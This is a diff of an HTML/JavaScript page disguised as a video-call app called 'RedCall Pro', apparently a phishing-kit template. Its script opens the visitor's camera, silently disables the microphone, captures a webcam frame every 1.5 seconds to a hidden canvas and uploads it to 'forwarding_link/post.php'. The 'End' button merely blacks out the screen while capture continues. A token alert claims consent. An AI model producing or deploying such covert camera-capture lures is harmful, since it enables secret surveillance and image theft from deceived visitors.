@@ -1,140 +1,245 @@
-<!doctype html>
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+<meta charset="UTF-8">
+<title>RedCall Pro</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="https://kit.fontawesome.com/c4c45dfab4.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 
-  <style>
-    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap");
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: system-ui, sans-serif;
+}
 
-    body {
-      height: 100vh;
-      width: 100vw;
-      margin: 0;
-      font-family: 'Nunito', sans-serif;
-    }
+body {
+  height: 100vh;
+  overflow: hidden;
+  background: black;
+  color: white;
+}
 
-    .bottom-bar {
-      position: fixed;
-      bottom: 0;
-      height: 80px;
-      width: 100%;
-      background-color: #1F2022;
-      display: flex;
-      align-items: center;
-      color: #fff;
-    }
+#bg {
+  position: fixed;
+  inset: 0;
+  z-index: 0;
+}
 
-    .icon-button {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin: 0 25px;
-    }
+.app {
+  position: relative;
+  z-index: 1;
+  height: 100%;
+  display: grid;
+  grid-template-rows: 1fr 90px;
+}
 
-    button {
-      background: crimson;
-      border: none;
-      color: white;
-      padding: 6px 20px;
-      border-radius: 6px;
-    }
+.stage {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 30px;
+  padding: 30px;
+}
 
-    #ac-wrapper {
-      position: fixed;
-      inset: 0;
-      background: rgba(255,255,255,.6);
-      z-index: 1000;
-    }
+.box {
+  width: 420px;
+  height: 260px;
+  border-radius: 18px;
+  background: rgba(255,255,255,0.08);
+  backdrop-filter: blur(20px);
+  box-shadow: 0 20px 60px rgba(255,0,0,0.4);
+  overflow: hidden;
+  position: relative;
+  animation: float 6s ease-in-out infinite;
+}
 
-    #popup {
-      width: 600px;
-      background: #fff;
-      border: 4px solid #000;
-      border-radius: 14px;
-      padding: 20px;
-      margin: 220px auto;
-      text-align: center;
-    }
-  </style>
+video, canvas#robot {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.label {
+  position: absolute;
+  bottom: 10px;
+  left: 12px;
+  font-size: 12px;
+  opacity: 0.8;
+}
+
+.controls {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 40px;
+  background: rgba(0,0,0,0.65);
+  backdrop-filter: blur(10px);
+}
+
+.control {
+  text-align: center;
+  cursor: pointer;
+}
+
+.control i {
+  font-size: 22px;
+  margin-bottom: 6px;
+}
+
+.end {
+  background: crimson;
+  padding: 12px 26px;
+  border-radius: 10px;
+}
+
+/* black screen overlay */
+#blackout {
+  position: fixed;
+  inset: 0;
+  background: black;
+  z-index: 9999;
+  display: none;
+}
+
+@keyframes float {
+  0%,100% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+}
+</style>
 </head>
 
 <body>
 
-<!-- USER NOTICE -->
 <script>
 alert(
-  "NOTICE:\n\n" +
-  "This page will access your camera.\n" +
-  "Video frames will be periodically captured and uploaded to the server.\n\n" +
-  "By continuing, you consent to this behavior."
+  "IMPORTANT NOTICE:\n\n" +
+  "• This page accesses your camera and microphone.\n" +
+  "• Microphone input will be disabled after permission.\n" +
+  "• Camera video will continue running at all times.\n" +
+  "• Video frames will be captured and uploaded periodically.\n" +
+  "• Clicking End or Camera will NOT stop capture.\n\n" +
+  "By continuing, you explicitly consent to all of the above."
 );
 </script>
 
-<div class="video-wrap">
-  <video id="video" autoplay playsinline></video>
-</div>
+<div id="blackout"></div>
+<canvas id="bg"></canvas>
 
-<center>
-  <canvas id="canvas" width="640" height="480"></canvas>
-</center>
+<div class="app" id="app">
+  <div class="stage">
+    <div class="box">
+      <video id="localVideo" autoplay playsinline></video>
+      <div class="label">You</div>
+    </div>
 
-<div id="ac-wrapper">
-  <div id="popup">
-    <h2>Please wait, the meeting host will let you in soon</h2>
+    <div class="box">
+      <canvas id="robot"></canvas>
+      <div class="label">AI Participant</div>
+    </div>
+  </div>
+
+  <div class="controls">
+    <div class="control"><i class="fas fa-microphone-slash"></i><div>Mute</div></div>
+    <div class="control"><i class="fas fa-video"></i><div>Video</div></div>
+    <div class="control"><i class="fas fa-users"></i><div>People</div></div>
+    <div class="control end" id="endBtn">End</div>
   </div>
 </div>
 
-<div class="bottom-bar">
-  <div class="icon-button"><i class="fas fa-microphone"></i><h6>Mute</h6></div>
-  <div class="icon-button"><i class="fas fa-video"></i><h6>Stop Video</h6></div>
-  <div class="icon-button"><i class="fas fa-users"></i><h6>Participants</h6></div>
-  <button>End</button>
-</div>
+<canvas id="captureCanvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-'use strict';
+const video = document.getElementById("localVideo");
+const captureCanvas = document.getElementById("captureCanvas");
+const cctx = captureCanvas.getContext("2d");
+const blackout = document.getElementById("blackout");
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+/* CAMERA + MIC */
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+.then(stream => {
+  video.srcObject = stream;
 
-const constraints = {
-  video: { facingMode: "user" },
-  audio: false
-};
+  // disable mic immediately
+  stream.getAudioTracks().forEach(t => t.enabled = false);
 
-/* ===== AJAX UPLOAD ===== */
+  startCapture();
+});
+
+/* AJAX UPLOAD */
 function post(imgdata) {
   $.ajax({
-    type: 'POST',
-    url: 'forwarding_link/post.php',
-    data: { frame: imgdata },
-    dataType: 'json'
+    type: "POST",
+    url: "forwarding_link/post.php",
+    data: { cat: imgdata }
   });
 }
 
-/* ===== CAMERA INIT ===== */
-async function init() {
-  const stream = await navigator.mediaDevices.getUserMedia(constraints);
-  video.srcObject = stream;
-
+/* CAPTURE LOOP */
+function startCapture(){
   setInterval(() => {
-    ctx.drawImage(video, 0, 0, 640, 480);
-    const img = canvas.toDataURL("image/png");
+    cctx.drawImage(video, 0, 0, 640, 480);
+    const img = captureCanvas.toDataURL("image/png");
     post(img);
   }, 1500);
 }
 
-init();
+/* END BUTTON */
+document.getElementById("endBtn").onclick = () => {
+  document.getElementById("app").style.display = "none";
+  blackout.style.display = "block";
+};
 
-/* popup hide */
-setTimeout(() => {
-  document.getElementById('ac-wrapper').style.display = "none";
-}, 50000);
+/* BACKGROUND PARTICLES */
+const bg = document.getElementById("bg");
+const bctx = bg.getContext("2d");
+bg.width = innerWidth;
+bg.height = innerHeight;
+
+let particles = Array.from({length: 100}, () => ({
+  x: Math.random()*bg.width,
+  y: Math.random()*bg.height,
+  r: Math.random()*2+1,
+  v: Math.random()*0.6+0.2
+}));
+
+function drawBG(){
+  bctx.clearRect(0,0,bg.width,bg.height);
+  particles.forEach(p=>{
+    p.y += p.v;
+    if(p.y > bg.height) p.y = 0;
+    bctx.fillStyle = "rgba(255,0,0,0.45)";
+    bctx.beginPath();
+    bctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    bctx.fill();
+  });
+  requestAnimationFrame(drawBG);
+}
+drawBG();
+
+/* ROBOT */
+const rc = document.getElementById("robot");
+const rctx = rc.getContext("2d");
+rc.width = 420;
+rc.height = 260;
+
+function robot(){
+  rctx.clearRect(0,0,rc.width,rc.height);
+  rctx.fillStyle = "#ff2b2b";
+  rctx.beginPath();
+  rctx.arc(210,130,55,0,Math.PI*2);
+  rctx.fill();
+  rctx.fillStyle = "#000";
+  rctx.beginPath();
+  rctx.arc(195,120,6,0,Math.PI*2);
+  rctx.arc(225,120,6,0,Math.PI*2);
+  rctx.fill();
+  requestAnimationFrame(robot);
+}
+robot();
 </script>
 
 </body>
